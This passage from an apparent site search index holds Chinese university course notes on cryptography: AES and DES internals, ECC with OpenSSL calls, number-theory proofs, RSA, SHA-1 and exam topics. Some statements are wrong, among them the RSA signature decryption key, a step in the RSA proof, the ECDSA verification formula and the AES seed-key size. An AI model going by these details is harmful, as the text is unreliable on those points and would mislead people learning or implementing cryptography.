\u9010\u884c\u8fdb\u884c\u5faa\u73af\u4f4d\u79fb\n    if(i != 10) // MixColumn\uff0c\u591a\u9879\u5f0f\u4e58\u6cd5\n        MixColumn(p, a, 1); /* do mul */ \n    else MixColumn(p, a, 0); /* don't mul */ \n    AddRoundKey(p, k+i*(4*4)); \n}\n</code></pre> <p>\u5728ShiftRow\u4e4b\u524d\u8fdb\u884c\u884c\u5217\u8868\u6362\u4e3b\u8981\u662f\u4e3a\u4e86\u65b9\u4fbf\u540e\u7eed\u7684MixColumn\u8fd0\u7b97(ShfitRow\u672c\u8eab\u8981\u548cMixColumn\u7ed3\u5408)</p> <p> \u5982\u679c\u4e0d\u5728ShiftRow\u4e4b\u524d\u8fdb\u884c\u884c\u5217\u8f6c\u6362\uff0c\u5728MixColumn\u4e2d\u8ba1\u7b97\u4f1a\u6bd4\u8f83\u590d\u6742 </p>"},{"location":"course/crypto/AES/#mixcolumn","title":"MixColumn","text":"<p>\u591a\u9879\u5f0f\u4e58\u6cd5(\u4e00\u6b21\u52a0\u5bc64byte\uff0c1byte\u8868\u793a\u4e00\u4e2a\u591a\u9879\u5f0f\u7cfb\u6570) \u4f8b\uff1a\\((3x^3+x^2+x+2)*(a_3x^3+a_2x^2+a_1x^1+a_0x^0)\\mod (x^4+1)\\) \u88ab\u4e58\u6570\\(3x^3+x^2+x+2\\)\u7ed9\u5b9a\uff0c\u5728\\(x^4+1\\)\u4e0b\u4e0d\u53ef\u7ea6\uff0c\u5176\u4e58\u6cd5\u9006\u5143\u4e3a\\(Bx^3+Dx^2+9x+E\\)\uff08\u82e5\\(3x^3+x^2+x+2\\)\u4e0d\u53ef\u7ea6\uff0c\u5219\\(x^4+1\\)(\u53ef\u62c6\u5206\u4e3a\\((x^2+1)^2\\)), \\(3x^3+x^2+x+2\\)\u53ef\u80fd\u4e0d\u4e92\u7d20\uff09</p> <ol> <li>\u672c\u8eab\u7684\u4e58\u6cd5</li> <li>\u603b\u6d41\u7a0b</li> <li>\u9ad8\u6b21\u7cfb\u6570\u5728\u4e0b\uff0c\u4f4e\u6b21\u7cfb\u6570\u5728\u4e0a\uff0c\u8fdb\u884c\u77e9\u9635\u4e58\u6cd5</li> <li>\u5de6\u4e58\u7684\u77e9\u9635\uff0c\u56e0\u4e3a\u539f\u591a\u9879\u5f0f\\((3x^3+x^2+x+2)\\)\u7ed9\u5b9a\uff0c\u6240\u4ee5\u8be5\u77e9\u9635\u4e5f\u56fa\u5b9a\u4e0d\u53d8</li> <li>\u7cfb\u6570\u7684\u8fd0\u7b97</li> <li>\u52a0\u6cd5\u4f7f\u7528\u5f02\u6216</li> <li>\u4e58\u6cd5\u4f7f\u7528\u519c\u592b\u7b97\u6cd5(\u4f7f\u5f97\u7ed3\u679c\u4ecd\u4e3a1byte)</li> </ol>"},{"location":"course/crypto/AES/#_1","title":"\u519c\u592b\u7b97\u6cd5","text":"<p>target: \\(x(8bit)*y(8bit)\\mod 11Bh = z(8bit)\\)</p> <pre><code>int z = 0;\nwhile(y){// \u7c7b\u4f3c\u5feb\u901f\u5e42\n    if(y&amp;1){\n        z = z ^ x;\n    }\n    x = x &lt;&lt; 1;\n    y = y &gt;&gt; 1;\n    if(x &amp; (1&lt;&lt;8)){\n        x = x ^ 0x11B // x = x - 11B \u56e0\u4e3a\u5728GF(2^8)\u4e2d\uff0c11B+11B=11B^11B=0\n    }\n}\n</code></pre>"},{"location":"course/crypto/AES/#sbox","title":"Sbox\u751f\u6210","text":"<p>sbox[a] =((\\(a^{-1}\\) * 0x1F) mod (\\(X^8\\) + 1)) ^ 0x63;</p>"},{"location":"course/crypto/AES/#_2","title":"\u8f6e\u5bc6\u94a5\u751f\u6210","text":"<p>\u4ee5\u6700\u521d\u76844byte\u5bc6\u94a5\u4f5c\u4e3a\u79cd\u5b50\u5bc6\u94a5\uff0c\u6bcf\u8f6e\u751f\u62104byte\u65b0\u5bc6\u94a5\uff0c\u5171\u8fdb\u884c10\u8f6e</p> <ol> <li>k[4] = k[3]</li> <li>k[4:7]\u5faa\u73af\u5de6\u79fb1byte</li> <li>k[4:7]\u5728sbox\u4e2d\u66ff\u6362</li> <li>k[4] ^= r (r = \\(2^{(i-4)/4}\\) mod 0x11B)</li> <li>k[4] ^= k[0]</li> <li>k[5] = k[4] ^ k[1]\uff1bk[6] = k[5] ^ k[2]\uff1bk[7] = k[6] ^ k[3]\uff1b</li> </ol>"},{"location":"course/crypto/AES/#math","title":"Math","text":""},{"location":"course/crypto/AES/#gf2","title":"\\(GF(2)\\)","text":"<p>\u52a0\u6cd5\u7b49\u6548\u4e8e\u5f02\u6216 0+1=1,1+0=1,0+0=0,1+1=0</p>"},{"location":"course/crypto/AES/#gf28","title":"\\(GF(2^8)\\)","text":"<p>\u52a0\u6cd5\u6309\u4f4d\u52a0\u6cd5(\u5f02\u6216)\uff0c\u4e0d\u8fdb\u4f4d 00110111+00001111=00111000 \u4efb\u610f\u4e00\u4e2a\u6570\u7684\u76f8\u53cd\u6570\u5c31\u662f\u5b83\u672c\u8eab 00110111+00110111=00000000</p>"},{"location":"course/crypto/DES/","title":"DES","text":"<p>Info</p> <ul> <li>2022/6/14 DES\u52a0\u5bc6\u8fc7\u7a0b\u8865\u5145\uff08R(48)\u548ckey\u5f02\u6216\uff09</li> </ul> <p>Data Encryption Standard \u5bc6\u94a5\u957f\u5ea6\u4e3a64bit \u660e\u6587\u52a0\u5bc6\u53ef\u91c7\u7528ECB\u3001CBC\u3001CFB  </p>"},{"location":"course/crypto/DES/#_1","title":"\u5927\u81f4\u6d41\u7a0b","text":""},{"location":"course/crypto/DES/#_2","title":"\u5bc6\u94a5\u5904\u7406","text":"<ul> <li>key\u5bc6\u94a5<ul> <li>\u5bc6\u94a5\uff0c64bit</li> <li>\u7ecf\u8fc7\u5904\u7406\u751f\u621016\u4e2a48bit\u7684key\uff0c\u7528\u4e8e16\u8f6e\u52a0\u5bc6\u5faa\u73af</li> </ul> </li> <li>key\u521d\u59cb\u5316<ul> <li>\u7528\u6237\u6307\u5b9a\u521d\u59cb\u5bc6\u94a5</li> <li><code>key_perm_table</code>: \u4ece8\u5b57\u8282\u7684key\u4e2d\u9009\u62e956bit\uff0c\u5e76\u62c6\u5206\u6210\u5de6\u53f3\u4e24\u534a(28bit+28bit)</li> </ul> </li> <li>key\u5faa\u73af\u8fc7\u7a0b<ol> <li><code>key_rol_steps</code>\uff0c\u4e24\u4e2a28bit\u5206\u522b\u5faa\u73af\u5de6\u79fb</li> <li><code>key_56bit_to_48bit_table</code>: \u4ece56bit\u4e2d\u9009\u51fa48\u4e2abit</li> <li>\u7ee7\u7eed\u6267\u884c\u6b65\u9aa4a</li> </ol> </li> </ul>"},{"location":"course/crypto/DES/#des_1","title":"DES\u52a0\u5bc6","text":"<ul> <li>IP(64bit-&gt;64bit)<ul> <li>\u7f6e\u6362</li> <li>\u4f7f\u7528perm\u8fdb\u884c\u67e5\u8868\u4f18\u5316</li> </ul> </li> <li>f(R(32),key(48)) (32bit-&gt;32bit)<ul> <li>\u7ecf\u8fc7\u4f4d\u9009\u62e9\u51fd\u6570E R(32)-&gt;R(48) (32bit-&gt;48bit)</li> <li>R(48)\u548ckey(48)\u5f02\u6216</li> <li>S\u76d2 <code>char S[8][64]</code> <code>8*(a1a2a3a4a5a6) = 8*S[a1a6][a2a3a4a5]</code> (48bit-&gt;32bit)<ul> <li></li> </ul> </li> <li>\u7f6e\u6362\u51fd\u6570P(32bit-&gt;32bit)</li> </ul> </li> <li>FP(64bit-&gt;64bit)<ul> <li>IP-1\uff0cIP\u7684\u9006\u8fd0\u7b97</li> <li>\u4f7f\u7528perm\u8fdb\u884c\u67e5\u8868\u4f18\u5316</li> </ul> </li> </ul>"},{"location":"course/crypto/DES/#des_2","title":"\u4e09\u91cdDES","text":"<p>c = E(D(E(p,k1), k2), k3) p = D(E(D(c,k3), k2), k1)</p>"},{"location":"course/crypto/ECC/","title":"ECC","text":"<p>\u692d\u5706\u66f2\u7ebf\u53ef\u4ee5\u5b9a\u4e49\u4e3a\u6240\u6709\u6ee1\u8db3\u65b9\u7a0b \\(E: y^2=x^3+ax+b\\) \u7684\u70b9(x,y)\u6240\u6784\u6210\u7684\u96c6\u5408\u3002</p>"},{"location":"course/crypto/ECC/#ecc_1","title":"ECC\u7b97\u6cd5\u7684\u516d\u8981\u7d20","text":"<ul> <li>a\uff0cb\uff1a\u692d\u5706\u66f2\u7ebf\u7cfb\u6570</li> <li>p\uff1a\u6a21\u6570</li> <li>\u57fa\u70b9G\uff08\u66f2\u7ebf\u4e0a\u7684\u4e00\u4e2a\u70b9\uff09</li> <li>G\u7684\u9636n (n * G = O)</li> <li>\u4f59\u56e0\u5b50 = \u66f2\u7ebf\u7684\u9636/G\u7684\u9636</li> </ul>"},{"location":"course/crypto/ECC/#ecc_2","title":"ECC\u7b97\u6cd5\u7684\u6570\u5b66\u57fa\u7840","text":"<ol> <li>\u692d\u5706\u66f2\u7ebf\u5728\u7d20\u57df\\(Z_p\\)\u4e0a\u7684\u8fd0\u7b97\u89c4\u5219<ul> <li>P+O=O+P=P;</li> <li>\u82e5P(\\(x_1\\),\\(y_1\\)), Q(\\(x_2\\),\\(y_2\\))\u6ee1\u8db3\\(x_1=x_2,y_1+y_2=0\\)\uff0c\u5219P+Q=O;</li> <li>\u82e5P(\\(x_1\\),\\(y_1\\)), Q(\\(x_2\\),\\(y_2\\))\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u6027\u8d28\uff0c\u5219<ul> <li>\\(x_3 = \\lambda^2-x_1-x_2\\)</li> <li>\\(y_3=\\lambda(x_1-x_3)-y_1\\)</li> <li>\u82e5\\(P\\ne Q\\)\uff0c\\(\\lambda=(y_2-y_1)/(x_2-x_1)\\);</li> <li>\u82e5\\(P=Q\\)\uff0c\\(\\lambda=(3x_1^2+a)/(2y_1)\\).</li> </ul> </li> </ul> </li> <li>\u692d\u5706\u66f2\u7ebf\u7684\u4e58\u6cd5\u6027\u8d28<ul> <li>\u82e5\\(Q=k*P\\)(k&lt;n)\uff0c\u5176\u4e2dk\u662f\u5e38\u6570\uff0cQ\u3001P\u662f\u66f2\u7ebf\u4e0a\u7684\u70b9\uff0c\u5219\u901a\u8fc7k,P\u8ba1\u7b97Q\u7b80\u5355\uff0c\u4f46\u662f\u901a\u8fc7Q\u3001P\u63a8\u7b97k\u8f83\u4e3a\u590d\u6742\u3002</li> </ul> </li> </ol>"},{"location":"course/crypto/ECC/#opensslecc","title":"OpenSSL\u4e2d\u7684ECC\u5e93","text":"<ul> <li>\u521b\u5efagroup <code>EC_GROUP *group=EC_GROUP_new(EC_GFp_simple_method());</code></li> <li>a,b,p\u521d\u59cb\u5316group <code>EC_GROUP_set_curve_GFp(group,p,a,b,ctx);</code></li> <li>\u521b\u5efa\u57fa\u70b9G\u5e76\u901a\u8fc7tx,ty\u521d\u59cb\u5316 <code>G=EC_POINT_new(group);</code> <code>EC_POINT_set_affine_coordinates_GFp(group,G,tx,ty,ctx);</code></li> <li>G,n,\u4f59\u56e0\u5b50(1)\u8bbe\u7f6egroup <code>EC_GROUP_set_generator(group, G, n, BN_value_one());</code></li> <li>\u83b7\u5f97\u70b9T\u7684\u5750\u6807(tx,ty) <code>EC_POINT_get_affine_coordinates_GFp(group,T,tx,ty,ctx)</code></li> <li>ECC\u4e0a\u7684\u52a0\u6cd5 T = T + G <code>EC_POINT_add(group,T,T,G,ctx)</code></li> <li>ECC\u4e0a\u7684\u4e58\u6cd5 T = m * G <code>EC_POINT_mul(group,T,m,NULL,NULL,ctx)</code><ul> <li>T = m * G + n * P <code>EC_POINT_mul(group,T,m,P,n,ctx)</code></li> </ul> </li> </ul>"},{"location":"course/crypto/ECC/#ecc_3","title":"ECC\u52a0\u5bc6\u89e3\u5bc6","text":"<ul> <li>\u516c\u94a5(\u516c\u94a5\u70b9) R = d * G</li> <li>\u79c1\u94a5 d (d &lt; n)</li> <li>\u52a0\u5bc6(r(x),s)<ul> <li>r(x) = (k * G).x mod p, \u5176\u4e2dk &lt; n, r(x)\u7ed3\u679c\u4e0d\u80fd\u5bf9n\u53d6\u6a21\uff0c\u800c\u662f\u5bf9p\u53d6\u6a21</li> <li>s = m * (k * R).x mod n, \u5176\u4e2dm\u4e3a\u660e\u6587</li> </ul> </li> <li>\u89e3\u5bc6(\u5229\u7528\u79c1\u94a5d)<ul> <li>\u901a\u8fc7r(x)\u63a8\u51fa\u70b9r</li> <li>m = s / (r * d).x     = (m * (k * R).x) / (k * G * d).x     = (m * (kd * G).x) / (kd * G).x     = m</li> </ul> </li> </ul>"},{"location":"course/crypto/ECC/#ecc_4","title":"ECC\u7b97\u6cd5\u7b7e\u540d","text":"<ul> <li>ecdsa(elliptic curve digital signature)<ul> <li>\u7b7e\u540d(r,s)<ul> <li>r = k * G</li> <li>s = (m + r * d)/k</li> </ul> </li> <li>\u9a8c\u8bc1: (m / s) * G + (r / s) * G == r</li> </ul> </li> <li>ecnr<ul> <li>\u7b7e\u540d(r,s)<ul> <li>r = (k * G).x + m</li> <li>s = k - (r * d).x</li> </ul> </li> <li>\u9a8c\u8bc1: r - (s * G + r * R) == m</li> </ul> </li> </ul>"},{"location":"course/crypto/Math/","title":"\u6570\u5b66\u57fa\u7840","text":""},{"location":"course/crypto/Math/#_2","title":"\u6700\u5927\u516c\u7ea6\u6570","text":"<ul> <li>\u8bbea\u3001b\u4e3a\u6574\u6570\uff0c\u4e14a\u3001b\u4e2d\u81f3\u5c11\u6709\u4e00\u4e2a\u4e0d\u7b49\u4e8e0\uff0c\u4ee4d=gcd(a,b)\uff0c\u5219\u4e00\u5b9a\u5b58\u5728\u6574\u6570x\u3001y\u4f7f\u5f97\u4e0b\u5f0f\u6210\u7acb\uff1a\\(a\\times x + b\\times y = d\\)</li> </ul>"},{"location":"course/crypto/Math/#_3","title":"\u7d20\u6570\u4e0e\u4e92\u7d20","text":"<ul> <li>\u82e5gcd(a, b) = 1\uff0c\u5219\u79f0a\u3001b\u4e92\u7d20</li> </ul>"},{"location":"course/crypto/Math/#_4","title":"\u6a21\u8fd0\u7b97\u4e0e\u540c\u4f59","text":"<p>\\(a \\equiv b \\mod n\\) \u53ef\u4ee5\u7406\u89e3\u4e3a <code>a%n == b%n</code></p>"},{"location":"course/crypto/Math/#inverse","title":"\u9006\u5143(inverse)","text":"<ul> <li>\u52a0\u6cd5\u9006\u5143 \\(a+b=0 \\mod n\\)</li> <li>\\(\u660e\u6587+\u5bc6\u94a5 \\equiv \u5bc6\u6587 \\mod n\\)\uff0c\\(\u5bc6\u6587+\u5bc6\u94a5\u9006\u5143\\equiv \u660e\u6587 \\mod n\\)</li> <li>\u4e58\u6cd5\u9006\u5143 \\(a*b=1 \\mod n\\)</li> <li>\\(\u660e\u6587\\times\u5bc6\u94a5 \\equiv \u5bc6\u6587 \\mod n\\)\uff0c\\(\u5bc6\u6587\\times\u5bc6\u94a5\u9006\u5143\\equiv \u660e\u6587 \\mod n\\)</li> <li>\u5145\u8981\u6761\u4ef6 \\(\\gcd(a,n)=1\\)</li> <li>\u6c42\u6cd5\uff1a\u6269\u5c55\u6b27\u51e0\u91cc\u5f97</li> </ul>"},{"location":"course/crypto/Math/#_5","title":"\u62d3\u5c55\u6b27\u51e0\u91cc\u5f97","text":"<p>\u62d3\u5c55\u6b27\u51e0\u91cc\u5f97\u53ef\u4ee5\u7528\u6765\u6c42\u4e58\u6cd5\u9006\u5143\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>\u4f8b\u5982\u6c42 13*x \u2261 1 (mod 35)\n35 = 2*13+ 9\n13 = 1*9 + 4\n9  = 2*4 + 1\n\n1 = 9-(2*4) \n  = (35 - 2*13) - (2*(13-1*9))\n  = 35 - 2*13 - 2*(13-1*(35-2*13))\n  = 35 - 2*13 - 2*13 + 2*(35-2*13)\n  = 3*35 - 8*13\n\u6240\u4ee5 (-8)*13 \u2261 1 (mod 35)\n\u53c8\u56e0\u4e3a -8 \u2261 27 (mod 35)\n\u6240\u4ee5 13*27 \u2261 1 (mod 35)\n13\u5728\u6a2135\u7684\u60c5\u51b5\u4e0b\uff0c\u4e58\u6cd5\u9006\u5143\u4e3a27\n</code></pre>"},{"location":"course/crypto/Math/#gcdxy-ax-by","title":"\u88f4\u8700\u5b9a\u7406 gcd(x,y) = ax + by","text":"<p>\u6839\u636e\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5</p> <pre><code>x = x0;\ny = y0;\nwhile(y){\n    int q = y/x;\n    int r = y%x;\n    y = x;\n    x = r;\n}\n</code></pre> <p>\u8bc1\u660e\uff0c\u5728\u6bcf\u4e00\u8f6e\u5faa\u73af\u4e2d\uff0c\u90fd\u6709</p> \\[ \\begin{aligned} &amp;x_i = a_{i1}x_0+b_{i1}y_0\\\\ &amp;y_i = a_{i2}x_0+b_{i2}y_0\\\\ \\end{aligned} \\] <p>\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5</p> <ol> <li>i = 1\u65f6\uff0c\\(x = x_0\\)\uff0c\\(y = y_0\\)\uff0c\u5373\\(a_{i1}=1,b_{i1}=0,a_{i2}=0,b_{i2}=1\\)</li> <li>i &gt;= 1\u65f6\uff0c\u82e5i\u6ee1\u8db3\u4e0a\u8ff0\u6761\u4ef6\uff0c\u5219</li> <li>\\(y_{i+1} = x_i = a_{i1}x_0 + b_{i1}y_0\\)\uff0c\\(a_{(i+1)2}=a_{i1},b_{(i+1)2}=b_{i1}\\)</li> <li>\\(x_{i+1}=y_{i}\\%x_{i}=(a_{i2}x_0+b_{i2}y)-k*(a_{i1}x_0+b_{i1}y_0)=(a_{i2}-ka_{i1})x_0+(b_{i2}-kb_{i1})y_0\\)\uff0c\\(a_{(i+1)1}=a_{i2}-ka_{i1}\\)\uff0c\\(b_{(i+1)1}=b_{i2}-kb_{i1}\\)</li> </ol> <p>Q.E.D</p>"},{"location":"course/crypto/Math/#_6","title":"\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406","text":"<p>\u8bbe\\(m_1,m_2,m_3,...,m_r\\)\u4e24\u4e24\u4e92\u7d20\uff0c\u5219\u4ee5\u4e0b\u540c\u4f59\u65b9\u7a0b\u7ec4 \\(x\\equiv a_i\\mod m_i,\\ i=1,2,3,...,r\\) \u6a21\\(M=m_1m_2m_3...m_r\\)\u7684\u552f\u4e00\u89e3\u4e3a \\(x=\\sum\\limits^{r}_{i=1}a_i*M_i*(M_i^{-1}{\\rm \\ mod\\ }m_i)\\mod M\\)\uff0c\u5176\u4e2d\\(M_i=M/m_i\\) \uff081\uff09\u5148\u8bc1\u660ex\u4e3a\u540c\u4f59\u65b9\u7a0b\u7684\u89e3 \u56e0\u4e3a\\(M_i\\equiv 0\\mod m_j(i\\ne j)\\)\uff0c\u6240\u4ee5\\(x\\equiv a_j\\mod m_j\\) \uff082\uff09\u518d\u8bc1\u660ex\u662f\u552f\u4e00\u89e3 \u5047\u8bbe\u4e0a\u8ff0\u540c\u4f59\u65b9\u7a0b\u7ec4\u6709\u4e24\u4e2a\u89e3\\(0\\le x_1,x_2&lt; M\\)\uff0c \u5219</p> \\[   \\begin{aligned} x_1&amp;\\equiv a_i\\mod m_i\\\\ x_2&amp;\\equiv a_i\\mod m_i\\\\ \\to x_1-x_2&amp;\\equiv 0 \\mod m_i \\end{aligned} \\] <p>\u53c8\u56e0\u4e3a\\(m_1,m_2,m_3,...,m_r\\)\u4e24\u4e24\u4e92\u7d20\uff0c\u6240\u4ee5\\(x_1 = k*M+x_2\\)\uff0c\u4e0e\u5047\u8bbe\u77db\u76fe Q.E.D</p>"},{"location":"course/crypto/Math/#euler","title":"Euler\u51c6\u5219","text":"<p>\u5bf9\u4e8e\u6574\u6570x\u548c\u5947\u7d20\u6570p\uff0cx\u662f\u6a21p\u7684\u5e73\u65b9\u5269\u4f59\uff08\\(y^2\\equiv x \\mod p\\)\uff09 \u7684\u5145\u8981\u6761\u4ef6\u662f \\(x^{(p-1)/2}\\equiv 1 \\mod p\\) </p> <p>\u8bc1\u660e\uff1a \uff081\uff09\u5fc5\u8981\u6027 \u56e0\u4e3agcd(x,p)=1, \\(y^2\\equiv x\\mod p\\)\uff0c \u6240\u4ee5gcd(y,p)=1 \u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\\(y^{p-1}\\equiv 1 \\mod p\\) \u6240\u4ee5 \\(x^{(p-1)/2}\\equiv 1\\mod p\\) \uff082\uff09\u5145\u5206\u6027 \u4e0d\u59a8\u8bbe\\(x\\in Z_p\\)\uff0c\u56e0\u4e3a\\(Z_p^{*}\\)={1,2,3,...,p-1}\u5728\u6a21p\u4e58\u6cd5\u4e0b\u662f\u5faa\u73af\u7fa4\uff0c\u6240\u4ee5\u4e00\u5b9a\u5b58\u5728\\(Z_p^*\\)\u7684\u4e00\u4e2a\u751f\u6210\u5143b\uff0c\u4f7f\u5f97 \\(x\\equiv b^i\\mod p\\) \u56e0\u4e3a \\(x^{(p-1)/2}\\equiv 1\\mod p\\) \u6240\u4ee5 \\(b^{i(p-1)/2}=(b^{p-1})^{i/2}\\equiv 1\\mod p\\) \u53c8\u56e0\u4e3a \\(b^{p-1}\\equiv 1\\mod p\\)\uff0c\u6240\u4ee5i\u4e3a\u5076\u6570 \u6240\u4ee5x\u6a21p\u7684\u5e73\u65b9\u6839\u5fc5\u6709\u6574\u6570\u89e3\uff0c\u5176\u503c\u4e3a\\(\\pm b^{i/2}\\) Q.E.D  </p>"},{"location":"course/crypto/RSA/","title":"RSA","text":"<p>Info</p> <ul> <li>2022/6/14 \u4fee\u6b63\u4e86\u5bf9RSA\u6b63\u786e\u6027\u7684\u8bc1\u660e </li> </ul> <ul> <li>e: \u52a0\u5bc6\u516c\u94a5</li> <li>d: \u89e3\u5bc6\u5bc6\u94a5</li> <li>N/n: \u5927\u6570</li> <li>p,q: \u4e24\u4e2a\u7d20\u6570</li> <li>m: \u660e\u6587</li> <li>c: \u5bc6\u6587</li> </ul>"},{"location":"course/crypto/RSA/#_1","title":"\u6570\u5b66\u524d\u63d0","text":"<ul> <li>\u6b27\u62c9\u51fd\u6570 \\(\\phi(n)\\): \u5c0f\u4e8e\\(n\\)\uff0c\u4e14\u4e0e\\(n\\)\u4e92\u7d20\u7684\u6570\u7684\u4e2a\u6570</li> <li>\u6b27\u62c9\u5b9a\u7406\uff1a\u82e5\\(gcd(x,n)=1\\)\uff0c\u5219\\(X^{\\phi(n)}\\equiv 1\\mod n\\)</li> <li>\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff1a\u82e5p\u4e3a\u7d20\u6570\uff0c\u5219\\(X^{p-1}\\equiv 1 \\mod p\\)</li> <li>\u6b27\u62c9\u51fd\u6570\u7684\u4e58\u6cd5\u6027\u8d28\uff1a\u82e5\\(\\gcd(x,y)=1\\)\uff0c\\(\\phi(xy)=\\phi(x)\\phi(y)\\)</li> </ul>"},{"location":"course/crypto/RSA/#_2","title":"\u5bc6\u94a5\u751f\u6210\u6d41\u7a0b","text":"<ul> <li>\u9009\u53d6\u4e24\u4e2a\u5927\u7d20\u6570 p \u548c q</li> <li>\u8ba1\u7b97\u51fa n = p * q</li> <li>\u968f\u673a\u9009\u53d6\u52a0\u5bc6\u5bc6\u94a5e(\u516c\u94a5)\uff0c\u4f7f\u5f97 gcd(e,(p-1)(q-1))=1</li> <li>\u8ba1\u7b97\u51fae\u5728(p-1)(q-1)\u4e0b\u7684\u4e58\u6cd5\u9006\u5143d\uff0c\u4f5c\u4e3a\u89e3\u5bc6\u5bc6\u94a5(\u79c1\u94a5)</li> <li>\u516c\u5f00(e,n)\u4f5c\u4e3a\u516c\u94a5</li> </ul>"},{"location":"course/crypto/RSA/#_3","title":"\u52a0\u89e3\u5bc6","text":"<ul> <li>\u52a0\u5bc6 \\(c=m^e\\ {\\rm mod}\\ N\\)</li> <li>\u89e3\u5bc6 \\(m=c^d\\ {\\rm mod}\\ N\\)</li> </ul>"},{"location":"course/crypto/RSA/#rsa_1","title":"RSA\u7b7e\u540d","text":"<ul> <li>\u52a0\u5bc6\u90ae\u4ef6\u7684\u6b65\u9aa4\uff08\u4fe1\u4ef6L\u7531A\u53d1\u7ed9B\uff09<ol> <li>\u4fe1\u4ef6L\u7528B\u7684\u516c\u94a5\u52a0\u5bc6</li> <li>\u628a\u5185\u5bb9\u53d1\u7ed9B</li> <li>B\u7528\u79c1\u94a5\u89e3\u5bc6\u4fe1\u4ef6</li> </ol> </li> <li>\u9a8c\u8bc1\u90ae\u4ef6\u7684\u6b65\u9aa4\uff08\u4fe1\u4ef6L\u7531A\u53d1\u7ed9B\uff09<ol> <li>L\u505aMD5\u6458\u8981\uff0cM=MD5(L)</li> <li>\u7528A\u7684\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6 M'=RSA(M,A\u7684\u79c1\u94a5)</li> <li>\u628aL\u3001M'\u548cA\u7684\u516c\u94a5\u53d1\u9001\u7ed9B</li> <li>B\u7528A\u7684\u79c1\u94a5\u89e3\u5bc6 m=RSA(M',A\u7684\u516c\u94a5)</li> <li>\u5224\u65adMD5(L)\u662f\u5426\u7b49\u4e8em</li> </ol> </li> </ul>"},{"location":"course/crypto/RSA/#rsa_2","title":"RSA\u6b63\u786e\u6027\u8bc1\u660e","text":"<p>\u5df2\u77e5 \\(c=m^e{\\rm\\ mod}\\ N\\), \\(ed\\equiv 1 \\mod (p-1)(q-1)\\), p\u3001q\u4e92\u7d20\uff0c\\(N=p*q\\) \u8bc1\u660e \\(m = c^d{\\rm\\ mod}\\ N\\)</p>"},{"location":"course/crypto/RSA/#step1","title":"Step1 \u516c\u5f0f\u5316\u7b80","text":"\\[ \\begin{aligned} &amp;c^d {\\rm\\ mod}\\ N \\\\ =&amp; (m^e)^d {\\rm\\ mod}\\ N\\\\ =&amp; m^{ed} {\\rm\\ mod}\\ N\\\\ =&amp; m^{k(p-1)(q-1)+1} {\\rm\\ mod}\\ N\\\\ =&amp; m*(m^{(p-1)(q-1)})^k {\\rm\\ mod}\\ N\\\\ \\end{aligned} \\]"},{"location":"course/crypto/RSA/#step2","title":"Step2 \u5206\u7c7b\u8ba8\u8bba\u8bc1\u660e","text":"<p>\uff081\uff09\u82e5\\(\\gcd(m,N)=1\\)\uff0c\u5219\\(m^{\\phi(N)}\\equiv 1\\mod N\\)</p> \\[ \\begin{aligned} &amp;\\because gcb(p,q)=1,\\phi(p)=p-1,\\phi(q)=q-1\\\\ &amp;\\therefore \\phi(pq)=\\phi(p)\\phi(q)=(p-1)(q-1)\\\\ &amp;\\therefore m^{(p-1)(q-1)}=m^{\\phi(pq)}=m^{\\phi(N)} \\equiv 1\\mod N\\\\ &amp;\\therefore m*(m^{(p-1)(q-1)})^k \\equiv m\\mod\\ N \\end{aligned} \\] <p>\uff082\uff09\u82e5\\(\\gcd(m,N)\\ne 1\\)</p> \\[ \\begin{aligned} &amp;\\because m&lt;N, \\gcd(m,N)\\ne1\\\\ &amp;\u5047\u8bbe gcd(m,M)=p\\ (m = cp), \u5219 m \\equiv 1 \\mod q\\\\ &amp; \\therefore m^{k(p-1)(q-1)} \\equiv (m^{q-1})^{k(p-1)} \\equiv 1\\mod q\\\\ &amp;\u4ee4 m^{k(p-1)(q-1)}=sq+1\\\\ &amp; \\therefore m*m^{k(p-1)(q-1)} = m * (s*q + 1) = c*s*p*q + m =c*s*N+m\\equiv m \\mod N\\\\ \\end{aligned} \\] <p>QED</p>"},{"location":"course/crypto/SHA1/","title":"SHA-1","text":"<ul> <li>SHA-1\u662f\u5c06\u660e\u6587\u5904\u7406\u621020byte\u7684\u54c8\u5e0c\u6458\u8981(\u6bd4MD5\u591a\u4e864byte)</li> <li>SHA-1\u4f7f\u7528\u5206\u5757\u8ba1\u7b97\uff0c\u6bcf\u5757\u7684\u957f\u5ea6\u4e3a64byte\uff0c\u586b\u5145\u65b9\u5f0f\u4e5f\u548cMD5\u76f8\u540c\u3002</li> </ul>"},{"location":"course/crypto/final/","title":"Crypto \u8003\u8bd5\u91cd\u70b9","text":""},{"location":"course/crypto/final/#_1","title":"\u9898\u578b","text":"<ul> <li>\u5355\u9009\u9898(20',10 \u9053)</li> <li>\u7b80\u7b54\u9898(20',4-5\u9053)<ul> <li>\u7b80\u5355\u63cf\u8ff0\u67d0\u4e2a\u7b97\u6cd5\u3001\u7b97\u6cd5\u7247\u6bb5\u7684\u539f\u7406</li> <li>\u7528\u7a0b\u5e8f\u5b9e\u73b0\u67d0\u4e2a\u7b97\u6cd5\u7684\u67d0\u4e2a\u90e8\u5206</li> <li>\u7b80\u5355\u7684\u8ba1\u7b97</li> </ul> </li> <li>\u8ba1\u7b97\u9898(40')<ul> <li>\u590d\u6742\u7684\u8ba1\u7b97\u516c\u5f0f\u4f1a\u5728\u8bd5\u5377\u4e0a\u7ed9\u51fa</li> </ul> </li> <li>\u8bc1\u660e\u9898(20',\u56db\u9009\u4e8c)<ul> <li>RSA</li> <li>\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406</li> <li>gcd(x,y)=nx+uy</li> <li>Euler\u51c6\u5219</li> </ul> </li> </ul>"},{"location":"course/crypto/final/#_2","title":"\u8003\u5bdf\u91cd\u70b9","text":"<ul> <li>enigma: \u4e86\u89e3\u52a0\u5bc6\u89e3\u5bc6\u8fc7\u7a0b(\u8003\u7b80\u7b54\u9898)\uff0c\u77e5\u9053\u5168\u8fc7\u7a0b</li> <li>md5, sha: 